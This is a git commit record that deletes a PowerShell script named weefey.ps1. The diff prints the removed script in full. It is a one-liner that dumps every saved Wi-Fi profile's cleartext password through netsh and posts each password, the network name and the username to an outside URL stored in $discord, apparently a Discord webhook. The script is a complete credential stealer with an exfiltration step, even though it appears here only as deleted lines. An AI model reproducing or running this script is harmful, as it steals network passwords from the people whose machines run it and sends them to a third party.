443177d3470e8c3cdd0a53c9de5ff4f379864539
JesusCries <62108395+WesleyWong420@users.noreply.github.com>
2025-02-25 23:59:07 +0800

    Delete weefey.ps1

--- weefey.ps1
+++
@@ -1,3 +0,0 @@
-netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object { $wlan = $_.Matches.Value; if (netsh wlan show profile $wlan key=clear | Select-String 'Security key\s+:\sPresent') { $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'; $Body = @{'username' = $env:username + " | " + [string]$wlan; 'content' = [string]$passw}; Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)}}
-
-exit
